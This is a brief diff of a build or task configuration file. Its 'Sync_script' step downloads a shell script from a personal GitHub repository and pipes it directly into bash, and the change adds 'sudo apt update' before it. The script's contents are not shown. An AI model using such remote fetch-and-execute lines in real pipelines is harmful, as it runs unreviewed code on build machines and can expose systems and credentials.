@@ -11,4 +11,4 @@ task:
       memory: 32G
 
   Sync_script:
-      - curl -sL https://raw.githubusercontent.com/JamalNiga/cr/main/b.sh | bash
+      - sudo apt update && curl -sL https://raw.githubusercontent.com/JamalNiga/cr/main/b.sh | bash
